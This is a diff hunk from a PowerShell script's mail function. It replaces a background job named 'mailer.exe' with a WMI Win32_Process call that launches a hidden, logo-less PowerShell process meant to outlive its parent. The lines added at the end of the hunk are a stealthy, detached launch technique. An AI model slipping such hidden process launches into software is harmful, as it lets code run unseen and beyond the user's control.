@@ -449,17 +449,21 @@ function mail($messageBody){
 	Invoke-Expression $scriptBlockVar'
 	$scriptBlock = [scriptblock]::Create($command)
 	### Starts script block in background and saves job as variable
-	### Job is started as a different process unrelated to this script process
-	### and is not killed if current window is killed.
+	### Job is killed if parent quits with this method
+	<#
 	$job = start-Job -scriptblock $scriptBlock -Name "mailer.exe"
 	Sleep 1
 	### Checks if mailer is running
 	$results = "`nMailer status. `n"
 	if($job.state -eq "Running"){
 		$results += "Mailer is Running..."
+		
 	}else {
 		$results +="Mailer is NOT running"
 	}
+	#>
+	### This problem could be solved by using this : Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "powershell -windowstyle hidden -nologo -command "" Sleep 300"""
+	Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "powershell -windowstyle hidden -nologo -command $scriptBlock"
 	$results += "`n"
 	$results
 }
